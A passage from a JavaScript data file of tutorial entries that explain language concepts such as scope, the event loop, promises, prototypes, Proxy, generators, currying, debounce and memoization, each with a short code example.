export { add, PI } from './math.js';`
  },
  {
    title: 'Scope & Lexical Environment',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'How JavaScript determines variable accessibility and lifetime.',
    content: 'Scope determines the visibility of variables. JavaScript has three main types of scope: Global, Function, and Block (since ES6). A Lexical Environment consists of local bindings and a reference to the outer environment. The scope chain is built lexically (based on where code is written, not where it is called).\n\nWhen a variable is accessed, the JS engine looks in the current scope. If not found, it traverses up the outer references (scope chain) until it reaches the Global scope. This lexical scoping means nested functions have access to variables declared in their outer scope, which directly enables Closures',
    example: `const globalVar = 'I am global';
function outer() {
  const outerVar = 'I am outer';
  function inner() {
    const innerVar = 'I am inner';
    console.log(globalVar, outerVar, innerVar); // Accesses all scopes
  }
  inner();
}`
  },
  {
    title: 'Value vs Reference Types',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Understanding how primitives and objects are stored in memory.',
    content: 'JavaScript assigns values differently based on type. Primitives (String, Number, Boolean, Null, Undefined, Symbol) are passed and assigned by value. When you copy them, you create an independent copy. Objects (including Arrays and Functions) are passed and assigned by reference. Copying an object copies the pointer to the memory location, not the data itself.\n\nThis distinction is crucial for bug prevention. Mutating an object through one reference mutates it for all variables holding that reference. To create independent copies of objects, you must perform shallow or deep cloning (using spread operator, Object.assign, or structuredClone)',
    example: `// By Value (Primitives)
let a = 10;
let b = a;
b = 20;
console.log(a); // 10 (unchanged)

// By Reference (Objects)
let obj1 = { name: 'Alice' };
let obj2 = obj1;
obj2.name = 'Bob';
console.log(obj1.name); // 'Bob' (mutated!)`
  },
  {
    title: 'Strict Mode',
    category: 'JavaScript',
    subcategory: 'Fundamentals',
    description: 'Opt-in restricted variant of JavaScript for better error catching.',
    content: '"use strict" enables Strict Mode, which eliminates some JS silent errors by changing them to throw errors. It fixes mistakes that make it difficult for engines to perform optimizations. Examples include: preventing accidental global variables, throwing on assignment to non-writable properties, and forbidding duplicate parameter names.\n\nES6 modules and classes are in strict mode by default. It is highly recommended to use strict mode in all scripts to catch common coding bloopers early and avoid relying on problematic legacy language features',
    example: `'use strict';
// x = 10; // ReferenceError: x is not defined (prevents global var)

const obj = {};
Object.defineProperty(obj, 'x', { value: 0, writable: false });
// obj.x = 3.14; // TypeError: Cannot assign to read only property

function sum(a, a, c) { // SyntaxError: Duplicate parameter name
  return a + a + c;
}`
  },

  // ═══════════════════════════════════════════
  // JAVASCRIPT — Advanced
  // ═══════════════════════════════════════════
  {
    title: 'Event Loop',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'The mechanism that enables non-blocking I/O in single-threaded JavaScript.',
    content: 'The Event Loop constantly monitors the Call Stack and Task Queues. When the stack is empty, it checks the Microtask Queue (Promises, queueMicrotask) first — all microtasks run before the next macrotask. Then it takes the next macrotask (setTimeout, setInterval, I/O). Rendering happens between tasks. Understanding this explains why Promises execute before setTimeout(fn, 0).\n\nThe Event Loop is the heart of JavaScript\'s concurrency model and is the mechanism that enables non-blocking I/O in a single-threaded language. JavaScript can only execute one piece of code at a time (single-threaded), but it can handle thousands of concurrent operations (async I/O, network requests, timers) without blocking. The Event Loop makes this possible by continuously monitoring the call stack and task queues. When the call stack is empty (all synchronous code has finished executing), the Event Loop checks for pending tasks and executes them in a specific order.\n\nThe task queue system is divided into two categories: macrotasks and microtasks. Macrotasks include setTimeout, setInterval, setImmediate (Node.js), I/O callbacks, and UI rendering. Microtasks include Promise callbacks (.then/.catch/.finally), queueMicrotask(), and MutationObserver. The critical rule is: all microtasks are processed before the next macrotask. This means if you have a Promise.then and a setTimeout both pending, the Promise callback will always execute first, regardless of when they were scheduled. This ordering is deterministic and is a key difference between microtasks and macrotasks.\n\nUnderstanding the Event Loop is essential for writing correct asynchronous code. It explains why console.log("A"); setTimeout(() => console.log("B"), 0); console.log("C"); outputs A, C, B — the setTimeout callback is a macrotask that waits for the call stack to empty. It explains why Promise.resolve().then(() => console.log("D")); setTimeout(() => console.log("E"), 0); outputs D, E — the microtask (Promise) runs before the next macrotask (setTimeout). Rendering typically happens between macrotasks, which is why long-running synchronous code can freeze the UI — it blocks the Event Loop from processing rendering tasks. To keep the UI responsive, break long operations into smaller chunks using setTimeout, requestAnimationFrame, or requestIdleCallback. The Event Loop is also why React 18\'s automatic batching and concurrent features work — they leverage microtask scheduling to defer and prioritize work',
    example: `console.log("1");              // Call Stack

setTimeout(() => console.log("2"), 0);  // Macrotask

Promise.resolve().then(() => console.log("3")); // Microtask

console.log("4");              // Call Stack

// Output: 1, 4, 3, 2
// Explanation:
// 1. "1" and "4" are synchronous (Call Stack)
// 2. "3" is a microtask (runs before next macrotask)
// 3. "2" is a macrotask (runs last)`
  },
  {
    title: 'Promises',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'An object representing the eventual completion or failure of an async operation.',
    content: 'A Promise is in one of three states: pending (initial), fulfilled (resolved), or rejected (failed). Promise chains with .then()/.catch()/.finally() handle async flow. Promise.all() resolves all, Promise.race() resolves first, Promise.allSettled() waits for all, Promise.any() resolves first success. Always return from .then() to chain properly.\n\nA Promise is an object representing the eventual completion or failure of an asynchronous operation. It was introduced in ES6 to solve the "callback hell" problem — deeply nested callbacks that made async code difficult to read and maintain. A Promise starts in the pending state and transitions to either fulfilled (the operation succeeded and produced a result) or rejected (the operation failed with an error). Once a Promise settles (fulfills or rejects), it stays in that state permanently — it cannot change again. This immutability is what makes Promises safe to pass around and chain.\n\nPromise chaining is the primary way to compose sequential asynchronous operations. Each .then() returns a new Promise, allowing you to chain operations. The key rule is: always return from .then() callbacks so the chain has something to resolve. If you forget to return, the next .then() in the chain receives undefined. Error handling in chains is done with .catch(), which catches errors from any preceding .then() in the chain. A common pattern is to place .catch() before .finally() — the finally block always executes regardless of success or failure and is used for cleanup. Rejecting a promise with throw inside a .then() propagates the rejection to the next .catch() in the chain.\n\nPromise combinators enable parallel execution of multiple async operations. Promise.all() takes an array of Promises and resolves when ALL of them resolve (or rejects if ANY rejects). It is useful for fetching related data in parallel. Promise.allSettled() waits for all Promises to settle regardless of outcome — each result is an object with status (fulfilled/rejected) and value/reason. Promise.race() resolves or rejects with the first settled Promise — useful for timeouts. Promise.any() resolves with the first fulfilled Promise and only rejects if ALL Promises reject — useful when you want the first success from multiple sources. Understanding these combinators and when to use each is essential for writing efficient async code. Common pitfalls include not handling rejections (leading to unhandled promise rejection warnings), creating unchained Promises (fire-and-forget patterns that lose error handling), and forgetting that Promise.all() short-circuits on the first rejection — use Promise.allSettled() when you need all results regardless of failures',
    example: `// Creating a promise
const fetchUser = (id) => new Promise((resolve, reject) => {
  setTimeout(() => {
    if (id > 0) resolve({ id, name: "Alice" });
    else reject(new Error("Invalid ID"));
  }, 1000);
});

// Chaining
fetchUser(1)
  .then(user => fetchPosts(user.id))
  .then(posts => console.log(posts))
  .catch(err => console.error(err))
  .finally(() => console.log("done"));

// Combining
const [user, posts] = await Promise.all([
  fetchUser(1),
  fetchPosts(1)
]);`
  },
  {
    title: 'Async/Await',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Syntactic sugar for working with Promises in a synchronous-looking way.',
    content: 'The async keyword makes a function return a Promise. await pauses execution until a Promise settles and returns its result. Use try/catch for error handling. Async/await makes asynchronous code read like synchronous code. You can use Promise.all() with destructuring for parallel operations. Top-level await is supported in ES modules.\n\nAsync/await is syntactic sugar over Promises that makes asynchronous code look and behave like synchronous code. An async function always returns a Promise — if you return a non-Promise value, it is automatically wrapped in a resolved Promise. The await keyword can only be used inside async functions (or at the top level of ES modules with top-level await). When you await a Promise, the function execution pauses but the Event Loop continues — other code, callbacks, and microtasks can still execute. When the awaited Promise resolves, the function resumes with the resolved value. If it rejects, an error is thrown that can be caught with try/catch.\n\nThe primary benefit of async/await is readability. Sequential async operations that would require nested .then() chains become flat, linear code. Error handling with try/catch is more natural than .catch() chains. Debugging is easier because you can step through async code line by line, and stack traces are more meaningful. However, sequential awaits can be a performance problem — if you await multiple independent operations one after another, you lose the parallelism that Promise.all() provides. The pattern for parallel execution is to create all Promises first, then await them together: const [users, posts] = await Promise.all([fetchUsers(), fetchPosts()]).\n\nCommon patterns and pitfalls: using try/catch with await for error handling, using Promise.all() for parallel operations, being aware that a for-loop with await inside executes sequentially (not in parallel), and understanding that unhandled errors in async functions reject the returned Promise. Top-level await (available in ES modules) allows you to use await outside async functions, which is useful for initialization code. However, top-level await can block module loading, so use it judiciously. Always handle errors — an unhandled rejection in an async function silently creates a rejected Promise that may go unnoticed. In Node.js, unhandled rejections crash the process by default. In browsers, they generate console warnings. Using a global unhandledrejection event handler as a last-resort safety net is good practice for production applications',
    example: `async function loadDashboard(userId) {
  try {
    const user = await fetchUser(userId);
    const [posts, notifications] = await Promise.all([
      fetchPosts(user.id),
      fetchNotifications(user.id)
    ]);
    return { user, posts, notifications };
  } catch (error) {
    console.error("Failed to load:", error);
    throw error;
  }
}

// Top-level await (in modules)
const response = await fetch('/api/data');
const data = await response.json();`
  },
  {
    title: 'Prototypal Inheritance',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Objects inherit directly from other objects via the prototype chain.',
    content: 'Unlike class-based inheritance, prototypal inheritance allows objects to be created from other objects. Object.create() creates a new object with a specified prototype. The __proto__ chain is traversed when accessing properties. ES6 classes are syntactic sugar over prototypal inheritance. instanceof checks the prototype chain.\n\nPrototypal inheritance is JavaScript\'s unique approach to code reuse and object composition. Unlike classical inheritance (used in Java, C#, Python) where you define a class that other classes inherit from, prototypal inheritance lets any object serve as a prototype for new objects. When you create an object with Object.create(proto), the new object inherits all properties and methods from proto. This inheritance is dynamic — changes to the prototype are immediately visible to all objects that inherit from it. This is fundamentally different from class-based copying of methods, where each instance gets its own copy of inherited methods.\n\nThe prototype chain is the mechanism by which property lookup works in JavaScript. When you access a property on an object, JavaScript first checks if the object has that property directly. If not, it walks up the prototype chain — checking the prototype, then the prototype\'s prototype, and so on — until it finds the property or reaches null (the end of the chain). This chain can be arbitrarily long, though in practice it is usually short. The Object.prototype sits at the top of most chains, providing default methods like toString() and hasOwnProperty(). Arrays inherit from Array.prototype, which provides methods like map(), filter(), and reduce(). Understanding this chain explains why you can call array methods on arrays even though you never defined them — they come from Array.prototype.\n\nES6 classes are syntactic sugar over prototypal inheritance. When you write class Dog extends Animal, JavaScript sets up a prototype chain where Dog.prototype inherits from Animal.prototype, and Dog inherits from Animal (for static methods). The new keyword creates an instance and links its [[Prototype]] to the constructor\'s prototype. This means that under the hood, JavaScript has always been prototype-based — classes just provide a more familiar syntax. The instanceof operator checks whether a constructor\'s prototype appears anywhere in an object\'s prototype chain, which is how it determines if an object is an "instance" of a class. Common mistakes include confusing the .prototype property with the [[Prototype]] link, modifying built-in prototypes (Array.prototype, Object.prototype) which affects all objects, and not understanding that prototypal inheritance is delegation (the prototype handles property access) not copying (each instance does not get its own copy of prototype methods)',
    example: `const vehicle = {
  start() { return "Engine started"; },
  stop() { return "Engine stopped"; }
};

const car = Object.create(vehicle);
car.drive = function() { return "Driving..."; };

const tesla = Object.create(car);
tesla.autopilot = function() { return "Auto-driving..."; };

console.log(tesla.start());      // "Engine started" (inherited)
console.log(tesla.drive());      // "Driving..." (inherited)
console.log(tesla.autopilot());  // "Auto-driving..." (own)

console.log(tesla instanceof car); // false (not class-based)`
  },
  {
    title: 'Proxy & Reflect',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Intercept and customize fundamental operations on objects.',
    content: 'A Proxy wraps an object and intercepts operations via traps (get, set, has, deleteProperty, etc.). Reflect provides default behavior for these traps. Used for validation, logging, reactive data binding, default values, and access control. Vue 3\'s reactivity system is built on Proxies.\n\nProxy and Reflect, introduced in ES6, enable metaprogramming — writing code that intercepts and customizes fundamental operations on objects. A Proxy wraps a target object and intercepts operations through "traps" — handler functions that are called instead of the default behavior. The handler object can define traps for dozens of operations: get (property access), set (property assignment), has (in operator), deleteProperty (delete), apply (function calls), construct (new operator), and many more. Each trap receives context about the operation, including the target object, the property being accessed, and the receiver (the proxy or the original object).\n\nReflect is a built-in object that provides methods corresponding to each Proxy trap. Its purpose is to provide the default implementation for each trap, making it easy to forward operations to the target when you want to intercept only some operations. For example, a validation proxy might intercept set to check the new value, then use Reflect.set() to perform the actual assignment. Reflect also provides a cleaner API for some operations that previously required awkward workarounds (like using the in operator for property existence checks). The Reflect methods have the same signatures as the Proxy traps, making the correspondence clear.\n\nPractical uses for Proxy are extensive: validation (preventing invalid property assignments), logging and auditing (tracking all property accesses and modifications), reactive data binding (detecting changes to trigger UI updates — Vue 3\'s reactivity system is built entirely on Proxy), default values (returning defaults for missing properties), access control (preventing access to certain properties), caching (memoizing expensive computations), and lazy initialization (deferring object creation until first access). The performance overhead of Proxy is non-trivial for hot paths, but acceptable for most use cases. Common pitfalls include creating circular proxies (causing infinite recursion), forgetting to use Reflect methods when forwarding operations, and not understanding that Proxy is transparent — code that uses the proxied object does not know it is a proxy, which can lead to confusing behavior when identity checks or instanceof are involved',
    example: `const handler = {
  get(target, prop, receiver) {
    console.log(\`Accessing: \${prop}\`);
    return Reflect.get(target, prop, receiver);
  },
  set(target, prop, value, receiver) {
    if (prop === 'age' && typeof value !== 'number') {
      throw new TypeError('Age must be a number');
    }
    console.log(\`Setting: \${prop} = \${value}\`);
    return Reflect.set(target, prop, value, receiver);
  }
};

const person = new Proxy({ name: "Alice", age: 25 }, handler);
person.age = 30;       // logs "Setting: age = 30"
// person.age = "old"; // TypeError: Age must be a number`
  },
  {
    title: 'WeakMap & WeakRef',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Memory-efficient collections that allow garbage collection of keys.',
    content: 'WeakMap keys must be objects and are weakly held (no strong reference preventing GC). Useful for private data, caching, and storing metadata without preventing garbage collection. WeakRef provides a weaker reference to an object. FinalizationRegistry runs cleanup when objects are collected. Both prevent memory leaks in long-running applications.\n\nWeakMap is a collection where keys must be objects and are "weakly" referenced — the WeakMap does not prevent the garbage collector from reclaiming the key object if there are no other strong references to it. This is the key distinction from Map, where keys are strongly referenced and remain in memory as long as the Map exists. WeakMap does not have a size property, does not support iteration (no keys(), values(), entries(), or forEach()), and only supports get, set, has, and delete operations. These limitations are by design — because entries can be garbage-collected at any time, the Map\'s contents are inherently unpredictable.\n\nThe primary use cases for WeakMap leverage its garbage collection properties. Private data: storing sensitive information (passwords, tokens, internal state) keyed by the object itself — when the object is garbage-collected, the private data is automatically cleaned up. This avoids the need for Symbol-based private properties or closure-based privacy. Caching: storing computed results keyed by the input object — if the input is garbage-collected, the cache entry disappears automatically, preventing memory leaks. Metadata: attaching non-enumerable data to objects without modifying them — useful in libraries that need to track objects without altering their structure. DOM node associations: storing data about DOM elements without preventing the elements from being removed from the DOM and garbage-collected.\n\nWeakRef, introduced in ES2021, provides a more explicit mechanism for weak references. A WeakRef created with new WeakRef(target) holds a weak reference to the target object. Calling weakRef.deref() returns the target if it is still alive, or undefined if it has been garbage-collected. FinalizationRegistry allows you to register a cleanup callback that runs when an object is garbage-collected — this is useful for releasing external resources (closing connections, clearing timers) associated with JavaScript objects. Both WeakRef and FinalizationRegistry should be used sparingly and only when the use case truly requires weak references. Overuse can lead to hard-to-debug behavior because object lifetime becomes non-deterministic. Common pitfalls include dereferencing a WeakRef and getting undefined without checking, using WeakRef where a regular reference would be simpler, and relying on FinalizationRegistry callbacks for critical cleanup (they are not guaranteed to run or run promptly)',
    example: `// WeakMap for private data
const privateData = new WeakMap();

class User {
  constructor(name, password) {
    privateData.set(this, { password });
    this.name = name;
  }
  checkPassword(pw) {
    return privateData.get(this).password === pw;
  }
}

// WeakMap for caching
const cache = new WeakMap();
function process(obj) {
  if (cache.has(obj)) return cache.get(obj);
  const result = heavyComputation(obj);
  cache.set(obj, result);
  return result;
}

// When obj is no longer referenced, cache entry is GC'd`
  },
  {
    title: 'Generators & Iterators',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Custom iteration protocols and lazy sequence generation.',
    content: 'A generator is a function that can be paused and resumed (function*). It yields values lazily using yield. The iterator protocol requires { next() } returning { value, done }. Generators are useful for lazy evaluation, infinite sequences, async iteration, and state machines. They power for...of loops internally.\n\nGenerators are functions that can be paused mid-execution and resumed later, maintaining their state between pauses. They are defined with function* (note the asterisk) and use the yield keyword to produce values and pause execution. When you call a generator function, it does not execute immediately — instead, it returns an iterator object. Each call to iterator.next() executes the generator until the next yield statement, returning { value: yieldedValue, done: false }. When the function reaches a return statement or the end of the function, it returns { value: returnValue, done: true }. This pausable, resumable nature makes generators fundamentally different from regular functions.\n\nThe iterator protocol and the iterable protocol work together to enable for...of loops. An iterable object implements [Symbol.iterator](), which returns an iterator with a next() method. When you use for...of, it repeatedly calls next() until done is true. Generators are iterators by default — a generator function returns an object that implements both the iterator and iterable protocols. This means generators work directly with for...of, spread, destructuring, and any other construct that consumes iterables. The yield* delegation syntax allows one generator to delegate to another, creating composable iteration pipelines.\n\nGenerators have powerful applications beyond simple iteration. Lazy evaluation: generators produce values on-demand, so you can work with infinite sequences (Fibonacci, prime numbers) without computing everything upfront. Async iteration: generators can yield Promises, enabling sequential async operations in a readable synchronous style (this is the basis of async/await). State machines: generators naturally model state transitions — each yield represents a state change, and the generator\'s local variables maintain state between transitions. Coroutine-like behavior: generators can receive values via iterator.next(value), enabling two-way communication. Common pitfalls include forgetting that generators are lazy (nothing executes until you call next()), not understanding that yield pauses execution (including any side effects), and confusion about when values are produced vs consumed. Understanding generators deepens your understanding of iteration, async patterns, and the fundamental capabilities of JavaScript as a language',
    example: `// Generator function
function* fibonacci() {
  let [a, b] = [0, 1];
  while (true) {
    yield a;
    [a, b] = [b, a + b];
  }
}

const fib = fibonacci();
console.log(fib.next().value); // 0
console.log(fib.next().value); // 1
console.log(fib.next().value); // 1
console.log(fib.next().value); // 2

// Custom iterator
const range = {
  from: 1, to: 5,
  [Symbol.iterator]() {
    let current = this.from;
    const last = this.to;
    return {
      next() {
        return current <= last
          ? { value: current++, done: false }
          : { done: true };
      }
    };
  }
};
console.log([...range]); // [1,2,3,4,5]`
  },
  {
    title: 'Symbols',
    category: 'JavaScript',
    subcategory: 'Advanced',
    description: 'Unique, immutable identifiers for object property keys.',
    content: 'Symbol is a primitive type that creates unique identifiers. Every Symbol() call returns a new unique value, even with the same description. Used as object property keys to avoid name collisions. Well-known symbols (Symbol.iterator, Symbol.toPrimitive) customize object behavior. Enables "private" properties and meta-programming.\n\nSymbol, introduced in ES6, is the eighth primitive type in JavaScript (alongside string, number, bigint, boolean, null, undefined, and symbol). Every Symbol() call creates a new, unique value — even if you provide the same description, two Symbols are never equal. The description is purely for debugging purposes and does not affect the Symbol\'s identity. This uniqueness makes Symbols ideal as object property keys when you need to guarantee that your key will not conflict with any other key, including keys from other codebases or libraries. Symbol properties are not enumerated by for...in or Object.keys(), which gives them a degree of privacy (though not true encapsulation).\n\nSymbol properties are accessed using bracket notation (obj[symbolKey]), not dot notation. This is because dot notation only works with string keys. To share a Symbol across multiple modules, use Symbol.for(description) which returns a Symbol from a global registry — if a Symbol with that description already exists, it returns the existing one. This is useful for shared protocols where multiple parts of an application need to agree on the same Symbol key. Well-known symbols are predefined Symbols that customize built-in behavior: Symbol.iterator defines the default iteration behavior, Symbol.toPrimitive defines how an object converts to a primitive value, Symbol.toStringTag controls the output of Object.prototype.toString(), and Symbol.hasInstance customizes instanceof behavior.\n\nThe most common use cases for Symbol are as unique property keys (to avoid namespace collisions in shared objects), as well-known symbol overrides (customizing how objects behave with built-in operations), and as a form of "soft" privacy (hiding internal properties from enumeration). Symbol.asyncIteration (Symbol.asyncIterator) enables async iteration with for await...of. Custom well-known symbols allow library authors to hook into JavaScript\'s built-in behavior in a standardized way. Common pitfalls include trying to use Symbol with JSON.stringify (Symbols are not serialized — they are silently dropped), confusing Symbol.for() (global registry) with Symbol() (unique), and not understanding that Symbol properties are not truly private — they can be accessed with Object.getOwnPropertySymbols(). Symbols are a powerful but often overlooked feature that adds depth to JavaScript\'s object system',
    example: `const id = Symbol('id');
const user = { [id]: 123, name: "Alice" };
console.log(user[id]); // 123
console.log(Object.keys(user)); // ["name"] (symbol hidden)

// Symbol.for — global registry
const s1 = Symbol.for('shared');
const s2 = Symbol.for('shared');
console.log(s1 === s2); // true

// Well-known symbols
class Money {
  constructor(amount) { this.amount = amount; }
  [Symbol.toPrimitive](hint) {
    return hint === 'string' ? \`$\${this.amount}\` : this.amount;
  }
}
console.log(\`Price: \${new Money(50)}\`); // "Price: $50"`
  },

  // ═══════════════════════════════════════════
  // JAVASCRIPT — Functional
  // ═══════════════════════════════════════════
  {
    title: 'Higher-Order Functions',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Functions that take or return other functions — the core of functional programming.',
    content: 'A higher-order function either accepts a function as an argument or returns a function. Array methods (map, filter, reduce, sort) are higher-order functions. They enable composition, abstraction, and declarative code. createCounter, debounce, throttle are all higher-order functions.\n\nHigher-order functions are a cornerstone of functional programming and one of JavaScript\'s most powerful features. A function is "higher-order" if it takes a function as an argument, returns a function, or both. This capability enables incredibly flexible abstractions. Array methods like map, filter, reduce, sort, find, some, and every are higher-order functions — they accept callback functions that define the operation to perform. This pattern separates the "what to do" (the callback) from the "how to do it" (the iteration and result building), leading to more modular, reusable, and readable code.\n\nThe practical benefits of higher-order functions are numerous. Code reuse: write the iteration logic once, pass different callbacks for different operations. Abstraction: hide complex implementation details behind simple function interfaces. Composition: build complex operations by combining simpler functions. Declarative style: express what you want to achieve rather than how to do it step by step. For example, numbers.filter(n => n > 5).map(n => n * 2) reads as a clear description of the transformation, while an equivalent for-loop would obscure the intent with index management and conditional logic.\n\nHigher-order functions are also the mechanism behind many common patterns: middleware (functions that wrap other functions to add behavior), decorators (functions that modify other functions), debouncing and throttling (functions that return rate-limited versions of the original), memoization (functions that return cached versions), and currying (functions that return partially-applied functions). Understanding higher-order functions is essential for reading modern JavaScript code, using libraries like Lodash and Ramda, working with React (higher-order components, though less common now), and implementing functional programming patterns. Common pitfalls include creating unnecessary intermediate arrays with chained methods (consider reduce for multi-step transformations), forgetting that map/filter/create new arrays (they do not mutate), and overusing functional patterns where simple imperative code would be clearer and faster',
    example: `// Function that returns a function
function multiplier(factor) {
  return (number) => number * factor;
}
const double = multiplier(2);
const triple = multiplier(3);
console.log(double(5)); // 10

// Array higher-order methods
const numbers = [1, 2, 3, 4, 5];
const result = numbers
  .filter(n => n % 2 === 0)   // [2, 4]
  .map(n => n * 10);           // [20, 40]

// Composing functions
const compose = (f, g) => (x) => f(g(x));
const add1 = x => x + 1;
const square = x => x * x;
const add1ThenSquare = compose(square, add1);
console.log(add1ThenSquare(3)); // (3+1)^2 = 16`
  },
  {
    title: 'Currying',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Transforming a multi-argument function into a chain of single-argument functions.',
    content: 'Currying converts f(a,b,c) into f(a)(b)(c). Useful for creating specialized functions from generic ones, partial application, and functional composition. In practice, partial application (fixing some arguments) is more common than full currying.\n\nCurrying is a technique named after mathematician Haskell Curry that transforms a function with multiple arguments into a sequence of functions each taking a single argument. A curried function f(a, b, c) becomes f(a)(b)(c) — calling f with the first argument returns a new function that accepts the second argument, and so on. This is different from partial application, which fixes some arguments and returns a function accepting the remaining ones. Currying is often confused with partial application, and in practice, partial application is more commonly useful in day-to-day JavaScript development.\n\nThe primary benefit of currying is the ability to create specialized functions from generic ones. If you have a generic function that formats numbers with a locale, currency, and precision, currying lets you create a US dollar formatter (formatCurrency("USD")("en-US")), which is a specialized function you can reuse throughout your application. This pattern reduces repetition and makes code more expressive. Currying is also essential for functional composition — when you compose functions with pipe() or compose(), many of the functions in the composition chain need to accept only one argument.\n\nIn JavaScript, currying is not built-in — you need a utility function to curry other functions. The implementation typically uses closures and checks if enough arguments have been provided. Libraries like Ramda and Lodash provide curry() utilities. In practice, partial application (using bind or closures) is more common than full currying. For example, const increment = add.bind(null, 1) partially applies the first argument. Arrow functions provide a natural currying syntax: const add = a => b => a + b. Common pitfalls include currying functions that should not be curried (adding complexity without benefit), not understanding the difference between currying and partial application, and creating deeply nested curried functions that hurt readability. Use currying when it genuinely improves code clarity and reduces repetition; do not use it just because it exists',
    example: `// Manual currying
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return (...args2) => curried(...args, ...args2);
  };
}

const add = curry((a, b, c) => a + b + c);
console.log(add(1)(2)(3));   // 6
console.log(add(1, 2)(3));   // 6
console.log(add(1)(2, 3));   // 6

// Practical: log with context
const log = curry((level, msg) => \`[\${level}] \${msg}\`);
const error = log("ERROR");
error("Something broke"); // "[ERROR] Something broke"`
  },
  {
    title: 'Debounce & Throttle',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Rate-limiting techniques for performance-critical event handlers.',
    content: 'Debounce delays execution until a pause in calls — ideal for search inputs and resize handlers. Throttle limits execution to once per interval — ideal for scroll and mousemove handlers. Both prevent performance bottlenecks from rapid-fire events.\n\nDebouncing and throttling are rate-limiting techniques that control how often a function executes in response to rapid events. Both are essential for maintaining application performance when handling events that fire many times per second (scroll, resize, mousemove, keystrokes, drag). Without rate-limiting, these events can trigger hundreds or thousands of function calls per second, causing performance degradation, excessive DOM manipulation, and unnecessary network requests. While both techniques limit execution frequency, they work differently and are suited to different use cases.\n\nDebounce works by delaying execution until a specified period has elapsed since the last call. If the function is called again before the delay expires, the timer resets. This means the function only executes once after the user stops triggering the event. It is ideal for search-as-you-type inputs (wait for the user to stop typing before sending the API request), form validation (wait for the user to finish filling a field), and window resize handlers (wait for the resize to stop before recalculating layout). The key characteristic of debounce is that the function always executes exactly once after the last event in a series of rapid events.\n\nThrottle works by limiting execution to at most once per specified time interval. Unlike debounce, throttle guarantees regular execution — it fires at the beginning or end of each interval regardless of how many events occurred. It is ideal for scroll handlers (updating scroll position indicators), mousemove handlers (tracking cursor position), game loop updates, and periodic status checks. The two variants are leading throttle (fires at the start of each interval) and trailing throttle (fires at the end). Libraries like Lodash provide both. Choosing between debounce and throttle depends on your use case: use debounce when you want to wait for the event to stop, use throttle when you want regular updates during the event. Both techniques are critical for performance in user-facing applications and are commonly implemented as higher-order functions that wrap the callback',
    example: `// Debounce — wait for pause
function debounce(fn, delay) {
  let timer;
  return function(...args) {
    clearTimeout(timer);
    timer = setTimeout(() => fn.apply(this, args), delay);
  };
}

const search = debounce((query) => {
  fetchResults(query);
}, 300);

input.addEventListener('input', (e) => search(e.target.value));

// Throttle — fire at most once per interval
function throttle(fn, limit) {
  let inThrottle;
  return function(...args) {
    if (!inThrottle) {
      fn.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

window.addEventListener('scroll', throttle(updatePosition, 100));`
  },
  {
    title: 'Memoization',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Caching function results for previously computed inputs.',
    content: 'Memoization stores the return value of a function based on its arguments. Ideal for expensive pure functions like recursive calculations. The cache acts as a lookup table — if the input was seen before, return the cached result instead of recomputing.\n\nMemoization is an optimization technique that caches the results of expensive function calls and returns the cached result when the same inputs occur again. It is a specific form of caching that applies to function outputs based on their arguments. Memoization is only applicable to pure functions — functions that always return the same output for the same input and have no side effects. If a function depends on external state, its results cannot be reliably cached because the same inputs might produce different outputs at different times. Memoization is particularly effective for functions with high computational cost, frequent repeated calls, and deterministic outputs.\n\nThe implementation of memoization typically uses a Map or object as a cache, with a key derived from the function arguments. For single-argument functions, the key is simply the argument. For multi-argument functions, the key is usually a serialized representation of all arguments (JSON.stringify or a custom key function). A simple memoize function wraps the original function and checks the cache before computing. If the result is cached, it is returned immediately. If not, the function is called, the result is stored in the cache, and then returned. The cache can be bounded (limited size with LRU eviction) or unbounded (grows indefinitely).\n\nThe classic use case for memoization is the Fibonacci sequence. Without memoization, computing fib(n) has exponential time complexity because it recomputes the same subproblems many times. With memoization, each subproblem is computed only once, reducing the complexity to linear. Other common use cases include caching API responses (keyed by request parameters), caching DOM query results, caching parsed/compiled results (regex, templates), and caching computed properties in state management. Libraries like Lodash provide memoize() with customizable cache size. Common pitfalls include using memoization on functions with side effects, not considering cache invalidation (when cached results become stale), using an unbounded cache that consumes too much memory, and memoizing functions that are already cheap (the overhead of cache lookup may exceed the computation cost). Memoization is a powerful tool but should be applied judiciously based on profiling data, not preemptively',
    example: `function memoize(fn) {
  const cache = new Map();
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key);
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

// Expensive recursive Fibonacci
const fib = memoize(function(n) {
  if (n <= 1) return n;
  return fib(n - 1) + fib(n - 2);
});

console.log(fib(40)); // Instant (with memoization)
// Without memoize: would take seconds`
  },
  {
    title: 'Pure Functions & Immutability',
    category: 'JavaScript',
    subcategory: 'Functional',
    description: 'Functions with no side effects and deterministic output — the backbone of reliable code.',
    content: 'A pure function always returns the same output for the same input and has no side effects (no DOM manipulation, no global state changes, no I/O). Immutability means never changing data — instead, create new copies with modifications. These principles make code predictable, testable, and easy to debug.\n\nPure functions and immutability are foundational principles of functional programming that have been adopted widely across modern JavaScript development, particularly in React and state management. A pure function has two properties: it always produces the same output for the same inputs (deterministic), and it has no observable side effects (it does not modify external state, DOM, network, or any data outside its scope). This purity makes functions trivially testable (no mocking, no setup, no cleanup), easy to reason about (the output depends only on the input), and safe to compose (no hidden interactions between functions).\n\nImmutability complements purity by ensuring that data is never modified after creation. Instead of mutating an existing array or object, you create a new one with the desired changes. For arrays, use map(), filter(), concat(), slice(), or spread ([...arr, newItem]) instead of push(), pop(), splice(), or sort(). For objects, use spread ({...obj, key: value}), Object.assign(), or structuredClone() instead of direct property assignment. Immutability eliminates an entire class of bugs: you never need to worry about a function modifying your data unexpectedly, you never need 